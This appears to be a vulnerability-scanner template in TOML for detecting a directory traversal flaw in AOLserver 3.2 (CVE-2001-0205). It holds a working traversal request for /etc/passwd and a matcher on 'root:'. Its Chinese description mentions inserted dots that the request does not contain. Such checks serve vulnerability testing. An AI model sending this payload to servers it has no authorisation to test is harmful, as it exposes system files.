[info]
author = "ave"
description = "验证 AOLserver 3.2 是否存在目录遍历漏洞。攻击者可在请求路径中插入多个点号（）绕过路径过滤，读取服务器任意敏感文件内容。"
id = "POC-AVE-2001-0080"
name = "AOLserver 3.2 目录遍历漏洞 PoC"
severity = "medium"
tags = ["ave-2001-0080"]
vuln_id = [
    "CVE-2001-0205",
    "AVE-2001-0080",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}///////////etc/passwd"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
